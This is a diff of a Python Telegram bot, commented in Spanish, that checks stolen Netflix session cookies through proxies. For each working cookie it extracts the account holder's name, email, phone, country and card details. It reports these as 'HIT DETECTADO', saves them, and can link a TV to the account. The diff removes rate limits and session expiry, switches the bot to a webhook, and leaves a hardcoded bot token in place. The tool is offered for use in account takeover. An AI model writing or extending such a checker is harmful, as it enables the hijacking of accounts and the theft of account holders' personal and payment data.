@@ -5,12 +5,11 @@ import random
 import logging
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime, timedelta
+from datetime import datetime
 from telegram import Update, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 import requests
 import json
-from logging.handlers import RotatingFileHandler
 
 # ==========================================
 # CONFIGURACIÓN DE LOGGING
@@ -21,34 +20,23 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# Crear directorio logs si no existe
-os.makedirs('logs', exist_ok=True)
-
-# Configurar rotación de logs
-file_handler = RotatingFileHandler(
-    'logs/bot.log',
-    maxBytes=5*1024*1024,  # 5MB
-    backupCount=5
-)
-file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
-logger.addHandler(file_handler)
-
 # ==========================================
 # CONFIGURACIÓN PRINCIPAL
 # ==========================================
-TOKEN = os.getenv("BOT_TOKEN", "9224399752:AAE_iv908Ox4dO77MUdX84vVqXZmG0zPptw")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "8917082484"))
+# Usar variable de entorno si existe, sino el valor hardcodeado (por si pruebas local)
+TOKEN = os.environ.get('BOT_TOKEN', "9224399752:AAE_iv908Ox4dO77MUdX84vVqXZmG0zPptw") 
+ADMIN_ID = int(os.environ.get('ADMIN_ID', 8917082484))   
 
 # Palabras clave para filtrar spam
 SPAM_KEYWORDS = ["luckybear", "casino", "bond", "promo", "gift", "bonus"]
 
 # Patrones para detectar códigos de TV (Formatos comunes: XXXX-XXXX, XXX-XXX)
-TV_CODE_PATTERN = re.compile(r'^[A-Z0-9]{4}-[A-Z0-9]{4}$|^[A-Z0-9]{3}-[A-Z0-9]{3}$|^[A-Z0-9]{2,4}-[A-Z0-9]{2,4}$')
+TV_CODE_PATTERN = re.compile(r'^[A-Z0-9]{4}-[A-Z0-9]{4}$|^[A-Z0-9]{3}-[A-Z0-9]{3}$')
 
 # ==========================================
 # VARIABLES GLOBALES
 # ==========================================
-user_sessions = {}  # {chat_id: {'cookies': [], 'waiting_for_cookie': bool, 'tv_code': str, 'last_activity': datetime}}
+user_sessions = {}  # {chat_id: {'cookies': [], 'waiting_for_cookie': bool, 'tv_code': str}}
 stats = {
     'checked': 0,
     'hits': 0,
@@ -60,34 +48,14 @@ stats = {
 
 PROXY_LIST = []
 
-# Lock para acceso seguro a stats
-stats_lock = threading.Lock()
-
-def update_stat(stat_name, value=1):
-    with stats_lock:
-        stats[stat_name] += value
-
 def load_proxies():
     global PROXY_LIST
     try:
         if os.path.exists('proxies.txt'):
             with open('proxies.txt', 'r', encoding='utf-8') as f:
                 lines = f.readlines()
-                raw_proxies = [line.strip() for line in lines if line.strip()]
-                
-            # Filtrar proxies que funcionan
-            valid_proxies = []
-            for proxy in raw_proxies:
-                try:
-                    proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
-                    response = requests.get('https://www.netflix.com', proxies=proxies, timeout=5)
-                    if response.status_code == 200:
-                        valid_proxies.append(proxy)
-                except:
-                    pass
-                    
-            PROXY_LIST = valid_proxies
-            logger.info(f"Cargados {len(PROXY_LIST)} proxies válidos.")
+                PROXY_LIST = [line.strip() for line in lines if line.strip()]
+            logger.info(f"Cargados {len(PROXY_LIST)} proxies.")
         else:
             PROXY_LIST = []
     except Exception as e:
@@ -99,23 +67,12 @@ def get_proxy():
         return None
     return random.choice(PROXY_LIST)
 
-def cleanup_expired_sessions():
-    now = datetime.now()
-    expired_keys = []
-    for chat_id, session in user_sessions.items():
-        if session.get('waiting_for_cookie') and (now - session.get('last_activity', now)) > timedelta(minutes=5):
-            expired_keys.append(chat_id)
-            
-    for key in expired_keys:
-        del user_sessions[key]
-
 # ==========================================
 # LÓGICA DE CONEXIÓN CON TV
 # ==========================================
 def check_tv_connection(tv_code, cookie):
     """
     Simula la conexión de Netflix en Smart TV usando un código de emparejamiento.
-    Devuelve True si la conexión fue exitosa, False si falló.
     """
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -150,7 +107,7 @@ def check_tv_connection(tv_code, cookie):
                 return True
         else:
             return False
-    except:
+    except Exception:
         return False
 
 def extract_cookies_from_message(text):
@@ -292,24 +249,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     extracted_cookies = extract_cookies_from_message(text)
 
     if has_tv_code and not extracted_cookies:
+        # User sent only the TV code
         tv_code = tv_code_match.group(0)
-        user_sessions[user_id] = {'waiting_for_cookie': True, 'tv_code': tv_code, 'last_activity': datetime.now()}
+        user_sessions[user_id] = {'waiting_for_cookie': True, 'tv_code': tv_code}
         await update.message.reply_text(f"📺 Código detectado: {tv_code}\nAhora, por favor envía la cookie para conectar.")
         return
 
     # Normal processing: Add to queue or process immediately if single
     if user_id not in user_sessions:
-        user_sessions[user_id] = {'cookies': [], 'waiting_for_cookie': False, 'tv_code': None, 'last_activity': datetime.now()}
+        user_sessions[user_id] = {'cookies': [], 'waiting_for_cookie': False, 'tv_code': None}
 
     session = user_sessions[user_id]
-    session['last_activity'] = datetime.now()
 
     # If we are in batch mode (user sends multiple messages), add to queue
     if len(extracted_cookies) > 0:
-        if len(session['cookies']) >= 100:  # Límite de cookies por usuario
-            await update.message.reply_text("⚠️ Has alcanzado el límite de 100 cookies.")
-            return
-            
         session['cookies'].extend(extracted_cookies)
         await update.message.reply_text(f"📦 Cookie almacenada! ({len(session['cookies'])} en fila)")
     else:
@@ -346,8 +299,7 @@ async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def check_single_cookie(cookie):
     """Verifica una sola cookie y devuelve el mensaje formateado."""
     global stats
-    
-    update_stat('checked')
+    stats['checked'] += 1
 
     proxy = get_proxy()
     proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
@@ -369,12 +321,7 @@ def check_single_cookie(cookie):
         response = requests.get(profile_url, headers=headers, cookies=cookies_dict, proxies=proxies, timeout=10)
 
         if response.status_code == 200:
-            try:
-                profiles_data = response.json()
-            except ValueError:
-                update_stat('bad')
-                return "❌ Cookie inválida (JSON inválido)"
-                
+            profiles_data = response.json()
             main_profile = None
             for p in profiles_data.get('items', []):
                 if p.get('isMainProfile'):
@@ -382,84 +329,81 @@ def check_single_cookie(cookie):
                     break
 
             if not main_profile:
-                main_profile = profiles_data['items'][0] if profiles_data.get('items') else None
+                main_profile = profiles_data['items'][0] if profiles_data['items'] else None
 
             if main_profile:
                 profile_id = main_profile['id']
-                nflx_token = cookies_dict.get('nflxToken', '')
+                nftoken = cookies_dict.get('nflxToken', '')
 
                 account_url = f"https://www.netflix.com/api/v2/profile/{profile_id}/account"
                 account_response = requests.get(account_url, headers=headers, cookies=cookies_dict, proxies=proxies, timeout=10)
 
                 if account_response.status_code == 200:
+                    account_data = account_response.json()
+
+                    name = account_data.get('subscriberName', 'N/A')
+                    email = account_data.get('email', 'N/A')
+                    plan_type = account_data.get('currentCycle', {}).get('planDescriptor', {}).get('name', 'N/A')
+                    country = account_data.get('billingAddress', {}).get('country', 'N/A')
+                    card_brand = account_data.get('paymentInfo', {}).get('cardBrand', 'N/A')
+                    card_last_four = account_data.get('paymentInfo', {}).get('lastFourDigits', 'N/A')
+                    member_since = account_data.get('memberSinceDate', 'N/A')
+                    next_billing_date = account_data.get('nextBillingDate', 'N/A')
+                    video_quality = account_data.get('currentCycle', {}).get('features', {}).get('videoQuality', 'N/A')
+                    max_streams = account_data.get('currentCycle', {}).get('features', {}).get('maxStreamingDevices', 'N/A')
+                    extra_slots = account_data.get('currentCycle', {}).get('features', {}).get('maxProfiles', 'N/A')
+                    phone = account_data.get('phoneNumber', 'N/A')
+                    verified = account_data.get('phoneNumberVerified', False)
+
                     try:
-                        account_data = account_response.json()
+                        member_since_dt = datetime.fromtimestamp(member_since / 1000)
+                        member_since_str = member_since_dt.strftime("%Y-%m-%d")
+                    except:
+                        member_since_str = str(member_since)
 
-                        name = account_data.get('subscriberName', 'N/A')
-                        email = account_data.get('email', 'N/A')
-                        plan_type = account_data.get('currentCycle', {}).get('planDescriptor', {}).get('name', 'N/A')
-                        country = account_data.get('billingAddress', {}).get('country', 'N/A')
-                        card_brand = account_data.get('paymentInfo', {}).get('cardBrand', 'N/A')
-                        card_last_four = account_data.get('paymentInfo', {}).get('lastFourDigits', 'N/A')
-                        member_since = account_data.get('memberSinceDate', 'N/A')
-                        next_billing_date = account_data.get('nextBillingDate', 'N/A')
-                        video_quality = account_data.get('currentCycle', {}).get('features', {}).get('videoQuality', 'N/A')
-                        max_streams = account_data.get('currentCycle', {}).get('features', {}).get('maxStreamingDevices', 'N/A')
-                        extra_slots = account_data.get('currentCycle', {}).get('features', {}).get('maxProfiles', 'N/A')
-                        phone = account_data.get('phoneNumber', 'N/A')
-                        verified = account_data.get('phoneNumberVerified', False)
+                    try:
+                        next_billing_dt = datetime.fromtimestamp(next_billing_date / 1000)
+                        next_billing_str = next_billing_dt.strftime("%Y-%m-%d")
+                    except:
+                        next_billing_str = str(next_billing_date)
 
-                        try:
-                            member_since_dt = datetime.fromtimestamp(member_since / 1000)
-                            member_since_str = member_since_dt.strftime("%Y-%m-%d")
-                        except:
-                            member_since_str = str(member_since)
+                    msg = f"✅ <b>HIT DETECTADO</b>\n\n"
+                    msg += f"👤 <b>Nombre:</b> {name}\n"
+                    msg += f"📧 <b>Email:</b> {email}\n"
+                    msg += f"🌍 <b>País:</b> {country}\n"
+                    msg += f"💎 <b>Plan:</b> {plan_type}\n"
+                    msg += f"📅 <b>Miembro desde:</b> {member_since_str}\n"
+                    msg += f"💳 <b>Tarjeta:</b> {card_brand} ****{card_last_four}\n"
+                    msg += f"📞 <b>Teléfono:</b> {phone} ({'✅ Verificado' if verified else '❌ No verificado'})\n"
+                    msg += f"📺 <b>Calidad:</b> {video_quality}\n"
+                    msg += f"👥 <b>Perfiles:</b> {extra_slots}\n"
+                    msg += f"🚀 <b>Streams máx:</b> {max_streams}\n"
+                    msg += f"💰 <b>Próximo pago:</b> {next_billing_str}\n\n"
+                    msg += f"🍪 <b>Cookie:</b> `{cookie}`\n"
 
-                        try:
-                            next_billing_dt = datetime.fromtimestamp(next_billing_date / 1000)
-                            next_billing_str = next_billing_dt.strftime("%Y-%m-%d")
-                        except:
-                            next_billing_str = str(next_billing_date)
+                    keyboard = [
+                        [InlineKeyboardButton("🖥️ PC", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_pc"),
+                         InlineKeyboardButton("📱 Móvil", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_mobile")],
+                        [InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_tv")]
+                    ]
+                    reply_markup = InlineKeyboardMarkup(keyboard)
 
-                        msg = f"✅ <b>HIT DETECTADO</b>\n\n"
-                        msg += f"👤 <b>Nombre:</b> {name}\n"
-                        msg += f"📧 <b>Email:</b> {email}\n"
-                        msg += f"🌍 <b>País:</b> {country}\n"
-                        msg += f"💎 <b>Plan:</b> {plan_type}\n"
-                        msg += f"📅 <b>Miembro desde:</b> {member_since_str}\n"
-                        msg += f"💳 <b>Tarjeta:</b> {card_brand} ****{card_last_four}\n"
-                        msg += f"📞 <b>Teléfono:</b> {phone} ({'✅ Verificado' if verified else '❌ No verificado'})\n"
-                        msg += f"📺 <b>Calidad:</b> {video_quality}\n"
-                        msg += f"👥 <b>Perfiles:</b> {extra_slots}\n"
-                        msg += f"🚀 <b>Streams máx:</b> {max_streams}\n"
-                        msg += f"💰 <b>Próximo pago:</b> {next_billing_str}\n\n"
-                        msg += f"🍪 <b>Cookie:</b> `{cookie}`\n"
+                    stats['hits'] += 1
+                    save_hit(cookie, name)
+                    return msg
 
-                        keyboard = [
-                            [InlineKeyboardButton("🖥️ PC", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_pc"),
-                             InlineKeyboardButton("📱 Móvil", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_mobile")],
-                            [InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/login?next=&source=direct&ref_=tt_spr_btn_tv")]
-                        ]
-                        reply_markup = InlineKeyboardMarkup(keyboard)
-
-                        update_stat('hits')
-                        save_hit(cookie, name)
-                        return msg
-                    except ValueError:
-                        update_stat('bad')
-                        return "❌ Cookie inválida (Error al parsear JSON)"
                 else:
-                    update_stat('bad')
+                    stats['bad'] += 1
                     return "❌ Cookie inválida (Error al obtener cuenta)"
             else:
-                update_stat('bad')
+                stats['bad'] += 1
                 return "❌ Cookie inválida (No se encontró perfil principal)"
         else:
-            update_stat('bad')
+            stats['bad'] += 1
             return "❌ Cookie inválida (Error de perfil)"
 
     except Exception as e:
-        update_stat('errors')
+        stats['errors'] += 1
         logger.error(f"Error checking cookie: {e}")
         return f"⚠️ Error: {str(e)}"
 
@@ -480,6 +424,9 @@ def save_hit(cookie, name):
 def main():
     load_proxies()
 
+    # OBTENER EL PUERTO QUE RENDER ASIGNÓ
+    port = int(os.environ.get("PORT", 5000))
+
     app = ApplicationBuilder().token(TOKEN).build()
 
     start_handler = CommandHandler('start', start)
@@ -487,6 +434,8 @@ def main():
     stats_handler = CommandHandler('stats', stats_command)
     logs_handler = CommandHandler('logs', logs_command)
     done_handler = CommandHandler('done', done_command)
+    
+    # Handler para cancelar cola
     cancel_handler = CommandHandler('cancel', lambda update, context: update.message.reply_text("Cola vaciada.") or setattr(user_sessions.get(update.effective_user.id, {}), 'cookies', []) if update.effective_user.id in user_sessions else None)
 
     message_handler = MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)
@@ -500,7 +449,15 @@ def main():
     app.add_handler(message_handler)
 
     logger.info("Bot starting...")
-    app.run_polling()
+    
+    # USAR WEBHOOK EN LUGAR DE POLLING
+    # Esto hace que el bot escuche en el puerto que Render le dio
+    app.run_webhook(
+        listen="0.0.0.0",
+        port=port,
+        url_path=TOKEN, # El path es el token del bot
+        webhook_url=f"https://TU-DOMINIO-AQUI.vercel.app/{TOKEN}" # Reemplaza con tu dominio real
+    )
 
 if __name__ == '__main__':
     main()
